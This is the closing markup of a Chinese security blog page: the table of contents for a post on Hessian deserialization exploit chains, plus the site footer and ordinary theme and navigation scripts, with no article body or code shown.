+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">2.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="nav-number">3.</span> <span class="nav-text">序列化过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HessianOutput"><span class="nav-number">3.1.</span> <span class="nav-text">HessianOutput</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HessianOutput2"><span class="nav-number">3.2.</span> <span class="nav-text">HessianOutput2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="nav-number">4.</span> <span class="nav-text">反序列化过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HessianInput"><span class="nav-number">4.1.</span> <span class="nav-text">HessianInput</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HessianInput2"><span class="nav-number">4.2.</span> <span class="nav-text">HessianInput2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%B0%8F%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">序列化&#x2F;反序列化流程小结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%B4%E6%97%B6%E4%BF%AE%E5%A4%8D"><span class="nav-number">6.</span> <span class="nav-text">临时修复</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">利用链总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HessianProxyFactory"><span class="nav-number">7.1.</span> <span class="nav-text">HessianProxyFactory</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jdk-only"><span class="nav-number">7.2.</span> <span class="nav-text">jdk-only</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%80%E7%BB%88Sink"><span class="nav-number">7.2.1.</span> <span class="nav-text">最终Sink</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SwingLazyValue-createValue"><span class="nav-number">7.2.1.1.</span> <span class="nav-text">SwingLazyValue#createValue</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ProxyLazyValue-createValue"><span class="nav-number">7.2.1.2.</span> <span class="nav-text">ProxyLazyValue#createValue</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9C%9F%C2%B7%E6%9C%80%E7%BB%88Sink"><span class="nav-number">7.2.2.</span> <span class="nav-text">真·最终Sink</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ServerManagerImpl-getActiveServers"><span class="nav-number">7.2.2.1.</span> <span class="nav-text">ServerManagerImpl#getActiveServers</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ClassPathXmlApplicationContext"><span class="nav-number">7.2.2.2.</span> <span class="nav-text">ClassPathXmlApplicationContext#</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JavaWrapper-main"><span class="nav-number">7.2.2.3.</span> <span class="nav-text">JavaWrapper#_main</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JavaUtils-writeBytesToFilename-System-load"><span class="nav-number">7.2.2.4.</span> <span class="nav-text">JavaUtils#writeBytesToFilename + System#load</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DumpBytecode-dumpBytecode"><span class="nav-number">7.2.2.5.</span> <span class="nav-text">DumpBytecode#dumpBytecode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MethodUtil-invoke"><span class="nav-number">7.2.2.6.</span> <span class="nav-text">MethodUtil#invoke</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TrAXFilter"><span class="nav-number">7.2.2.7.</span> <span class="nav-text">TrAXFilter#</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UIDefaults-get%E8%A7%A6%E5%8F%91"><span class="nav-number">7.2.3.</span> <span class="nav-text">UIDefaults#get触发</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B5%B0toString"><span class="nav-number">7.2.3.1.</span> <span class="nav-text">走toString</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#sun-security-pkcs-PKCS9Attributes"><span class="nav-number">7.2.3.1.1.</span> <span class="nav-text">sun.security.pkcs.PKCS9Attributes</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#javax-activation-MimeTypeParameterList"><span class="nav-number">7.2.3.1.2.</span> <span class="nav-text">javax.activation.MimeTypeParameterList</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">7.2.3.2.</span> <span class="nav-text">其他</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#HashTable-equals"><span class="nav-number">7.2.3.2.1.</span> <span class="nav-text">HashTable#equals</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#toString%E6%80%8E%E4%B9%88%E8%A7%A6%E5%8F%91"><span class="nav-number">7.2.4.</span> <span class="nav-text">toString怎么触发</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87expect%E8%A7%A6%E5%8F%91"><span class="nav-number">7.2.4.1.</span> <span class="nav-text">通过expect触发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XString%E5%AE%B6%E6%97%8F"><span class="nav-number">7.2.4.2.</span> <span class="nav-text">XString家族</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#AudioFileFormat-Type"><span class="nav-number">7.2.4.3.</span> <span class="nav-text">AudioFileFormat.Type</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ConcurrentHashMap"><span class="nav-number">7.2.4.4.</span> <span class="nav-text">ConcurrentHashMap</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BA%E7%BD%91JNDI%E6%89%93%E6%B3%95"><span class="nav-number">7.3.</span> <span class="nav-text">出网JNDI打法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Spring-PartiallyComparableAdvisorHolder"><span class="nav-number">7.3.1.</span> <span class="nav-text">Spring PartiallyComparableAdvisorHolder</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Spring-AbstractBeanFactoryPointcutAdvisor"><span class="nav-number">7.3.2.</span> <span class="nav-text">Spring AbstractBeanFactoryPointcutAdvisor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Rome%E9%93%BE"><span class="nav-number">7.3.3.</span> <span class="nav-text">Rome链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Resin%E9%93%BE"><span class="nav-number">7.3.4.</span> <span class="nav-text">Resin链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XBean%E9%93%BE"><span class="nav-number">7.3.5.</span> <span class="nav-text">XBean链</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Groovy"><span class="nav-number">7.4.</span> <span class="nav-text">Groovy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GString%E9%93%BE"><span class="nav-number">7.4.1.</span> <span class="nav-text">GString链</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#hessian%E5%88%A9%E7%94%A8"><span class="nav-number">7.4.1.1.</span> <span class="nav-text">hessian利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><span class="nav-number">7.4.1.2.</span> <span class="nav-text">原生反序列化利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ContinuationDirContext%E9%93%BE"><span class="nav-number">7.4.2.</span> <span class="nav-text">ContinuationDirContext链</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#UTF8-OverlongEncoding%E7%BB%95%E8%BF%87"><span class="nav-number">8.</span> <span class="nav-text">UTF8-OverlongEncoding绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hessian%E7%9B%B8%E5%85%B3%E7%9A%84%E5%85%B6%E4%BB%96%E5%86%85%E5%AE%B9"><span class="nav-number">9.</span> <span class="nav-text">hessian相关的其他内容</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">9.1.</span> <span class="nav-text">kryo反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dubbo"><span class="nav-number">9.2.</span> <span class="nav-text">dubbo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nacos"><span class="nav-number">9.3.</span> <span class="nav-text">nacos</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HessianServlet%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">9.4.</span> <span class="nav-text">HessianServlet中的反序列化</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0"><span class="nav-number">10.</span> <span class="nav-text">后记</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">11.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2025</span>&nbsp;-&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">1diot9</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">153.9k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">2.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="nav-number">3.</span> <span class="nav-text">序列化过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HessianOutput"><span class="nav-number">3.1.</span> <span class="nav-text">HessianOutput</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HessianOutput2"><span class="nav-number">3.2.</span> <span class="nav-text">HessianOutput2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="nav-number">4.</span> <span class="nav-text">反序列化过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HessianInput"><span class="nav-number">4.1.</span> <span class="nav-text">HessianInput</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HessianInput2"><span class="nav-number">4.2.</span> <span class="nav-text">HessianInput2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%B0%8F%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">序列化&#x2F;反序列化流程小结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%B4%E6%97%B6%E4%BF%AE%E5%A4%8D"><span class="nav-number">6.</span> <span class="nav-text">临时修复</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">利用链总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HessianProxyFactory"><span class="nav-number">7.1.</span> <span class="nav-text">HessianProxyFactory</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jdk-only"><span class="nav-number">7.2.</span> <span class="nav-text">jdk-only</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%80%E7%BB%88Sink"><span class="nav-number">7.2.1.</span> <span class="nav-text">最终Sink</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SwingLazyValue-createValue"><span class="nav-number">7.2.1.1.</span> <span class="nav-text">SwingLazyValue#createValue</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ProxyLazyValue-createValue"><span class="nav-number">7.2.1.2.</span> <span class="nav-text">ProxyLazyValue#createValue</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9C%9F%C2%B7%E6%9C%80%E7%BB%88Sink"><span class="nav-number">7.2.2.</span> <span class="nav-text">真·最终Sink</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ServerManagerImpl-getActiveServers"><span class="nav-number">7.2.2.1.</span> <span class="nav-text">ServerManagerImpl#getActiveServers</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ClassPathXmlApplicationContext"><span class="nav-number">7.2.2.2.</span> <span class="nav-text">ClassPathXmlApplicationContext#</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JavaWrapper-main"><span class="nav-number">7.2.2.3.</span> <span class="nav-text">JavaWrapper#_main</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JavaUtils-writeBytesToFilename-System-load"><span class="nav-number">7.2.2.4.</span> <span class="nav-text">JavaUtils#writeBytesToFilename + System#load</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DumpBytecode-dumpBytecode"><span class="nav-number">7.2.2.5.</span> <span class="nav-text">DumpBytecode#dumpBytecode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MethodUtil-invoke"><span class="nav-number">7.2.2.6.</span> <span class="nav-text">MethodUtil#invoke</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TrAXFilter"><span class="nav-number">7.2.2.7.</span> <span class="nav-text">TrAXFilter#</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UIDefaults-get%E8%A7%A6%E5%8F%91"><span class="nav-number">7.2.3.</span> <span class="nav-text">UIDefaults#get触发</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B5%B0toString"><span class="nav-number">7.2.3.1.</span> <span class="nav-text">走toString</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#sun-security-pkcs-PKCS9Attributes"><span class="nav-number">7.2.3.1.1.</span> <span class="nav-text">sun.security.pkcs.PKCS9Attributes</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#javax-activation-MimeTypeParameterList"><span class="nav-number">7.2.3.1.2.</span> <span class="nav-text">javax.activation.MimeTypeParameterList</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">7.2.3.2.</span> <span class="nav-text">其他</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#HashTable-equals"><span class="nav-number">7.2.3.2.1.</span> <span class="nav-text">HashTable#equals</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#toString%E6%80%8E%E4%B9%88%E8%A7%A6%E5%8F%91"><span class="nav-number">7.2.4.</span> <span class="nav-text">toString怎么触发</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87expect%E8%A7%A6%E5%8F%91"><span class="nav-number">7.2.4.1.</span> <span class="nav-text">通过expect触发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XString%E5%AE%B6%E6%97%8F"><span class="nav-number">7.2.4.2.</span> <span class="nav-text">XString家族</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#AudioFileFormat-Type"><span class="nav-number">7.2.4.3.</span> <span class="nav-text">AudioFileFormat.Type</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ConcurrentHashMap"><span class="nav-number">7.2.4.4.</span> <span class="nav-text">ConcurrentHashMap</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BA%E7%BD%91JNDI%E6%89%93%E6%B3%95"><span class="nav-number">7.3.</span> <span class="nav-text">出网JNDI打法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Spring-PartiallyComparableAdvisorHolder"><span class="nav-number">7.3.1.</span> <span class="nav-text">Spring PartiallyComparableAdvisorHolder</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Spring-AbstractBeanFactoryPointcutAdvisor"><span class="nav-number">7.3.2.</span> <span class="nav-text">Spring AbstractBeanFactoryPointcutAdvisor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Rome%E9%93%BE"><span class="nav-number">7.3.3.</span> <span class="nav-text">Rome链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Resin%E9%93%BE"><span class="nav-number">7.3.4.</span> <span class="nav-text">Resin链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XBean%E9%93%BE"><span class="nav-number">7.3.5.</span> <span class="nav-text">XBean链</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Groovy"><span class="nav-number">7.4.</span> <span class="nav-text">Groovy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GString%E9%93%BE"><span class="nav-number">7.4.1.</span> <span class="nav-text">GString链</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#hessian%E5%88%A9%E7%94%A8"><span class="nav-number">7.4.1.1.</span> <span class="nav-text">hessian利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><span class="nav-number">7.4.1.2.</span> <span class="nav-text">原生反序列化利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ContinuationDirContext%E9%93%BE"><span class="nav-number">7.4.2.</span> <span class="nav-text">ContinuationDirContext链</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#UTF8-OverlongEncoding%E7%BB%95%E8%BF%87"><span class="nav-number">8.</span> <span class="nav-text">UTF8-OverlongEncoding绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hessian%E7%9B%B8%E5%85%B3%E7%9A%84%E5%85%B6%E4%BB%96%E5%86%85%E5%AE%B9"><span class="nav-number">9.</span> <span class="nav-text">hessian相关的其他内容</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">9.1.</span> <span class="nav-text">kryo反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dubbo"><span class="nav-number">9.2.</span> <span class="nav-text">dubbo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nacos"><span class="nav-number">9.3.</span> <span class="nav-text">nacos</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HessianServlet%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">9.4.</span> <span class="nav-text">HessianServlet中的反序列化</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0"><span class="nav-number">10.</span> <span class="nav-text">后记</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">11.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
